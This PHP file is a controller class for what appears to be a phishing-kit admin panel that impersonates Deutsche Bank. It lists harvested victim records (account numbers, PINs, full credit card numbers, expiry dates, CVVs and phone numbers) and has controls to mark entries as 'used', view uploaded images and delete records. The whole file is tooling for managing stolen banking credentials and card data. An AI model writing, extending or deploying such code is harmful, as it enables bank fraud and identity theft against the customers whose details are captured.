<?php
include_once '../config/database.php';
include_once '../Model/DataModel.php';

class DataController {
    private $db;
    private $dataModel;

    public function __construct() {
        $database = new Database();
        $this->db = $database->getConnection();
        $this->dataModel = new DataModel($this->db);
    }


    public function getAllData($start, $limit, $order = 'asc', $used = 0) {
        $data =  $this->dataModel->getAllData($start, $limit, $order, $used);

        $arr = [];
        $i = 0;
        foreach($data as $row) {
            $id = $row['id'];
            $randomId = $row['randomId'];
            $subsidiaryCompany = $row['subsidiaryCompany'];
            $account = $row['account'];
            $subAccount = $row['subAccount'];
            $pin = $row['pin'];
            $directTo = $row['directTo'];
            $created_at = $row['created_at'];
            $uploadedImage = $row['uploadedImage'];
            $creditCardNumber = $row['creditCardNumber'];
            $exp_date = $row['exp_date'];
            $cvv = $row['cvv'];
            $phoneNumber = $row['phoneNumber'];


            $checkBox = "<div class='checkbox-container'><input type='checkbox' class='form-control' name='check[]' value='$id'></div>";


            $quickData = "Subsidiary Company: $subsidiaryCompany<br>
                            Account: $account<br>
                            Sub Account: $subAccount<br>
                            Pin: $pin<br>
                            Direct To: $directTo<br>
                            Credit Card Number: $creditCardNumber<br>
                            Exp Date: $exp_date<br>
                            Cvv: $cvv<br>
                            Phone Number: $phoneNumber";

            $comment = "<button class='btn btn-success comment' data-id='$id'><i class='fa fa-edit'></i></button>";

            $getCommentByLoginIdResponse = $this->getCommentByLoginId($id);

            if($getCommentByLoginIdResponse){
                $textComment = $getCommentByLoginIdResponse[0]['comment'];
                $comment .= "<div class='mt-3'><p class='comment-text' data-id='$id'>$textComment</p></div>";
            }
           
            $checkButton = ($used == 0 ? "<button class='btn btn-secondary check' data-id='$id' data-used='$used'><i class='fa fa-check'></i></button>" : '');
            $deleteButton = "<button class='btn btn-danger delete' data-id='$id'><i class='fa fa-trash'></i></button>";
            $viewImageButton = ($uploadedImage != '0' ? "<button class='btn btn-info view-image' data-id='$id'><i class='fa fa-image'></i></button>" : '');

            $arr[] = [
                $checkBox,
                $randomId,
                'Deutsche Bank',
                $quickData,
                $created_at,
                $comment,
                $checkButton. ' ' . $viewImageButton.' '.$deleteButton
            ];
            
            $i++;
        }

        return $arr;
    }
   
    public function getDataCount($used) {
        return $this->dataModel->getDataCount($used);
    }

    public function deleteDataById($id) {
        return $this->dataModel->deleteDataById($id);
    }

    public function getUploadedImageByLoginId($id) {
        return $this->dataModel->getUploadedImageByLoginId($id);
    }

    public function getCommentByLoginId($id) {
        return $this->dataModel->getCommentByLoginId($id);
    }

    public function createComment($id, $comment) {
        return $this->dataModel->createComment($id, $comment);
    }

    public function updateComment($id, $comment) {
        return $this->dataModel->updateComment($id, $comment);
    }

    public function bulkDeleteByIds($ids) {
        return $this->dataModel->bulkDeleteByIds($ids);
    }

    public function updateUsed($id, $used) {
        return $this->dataModel->updateUsed($id, $used);
    }
    public function bulkUpdateUsed($ids, $used) {
        return $this->dataModel->bulkUpdateUsed($ids, $used);
    }
}
?>
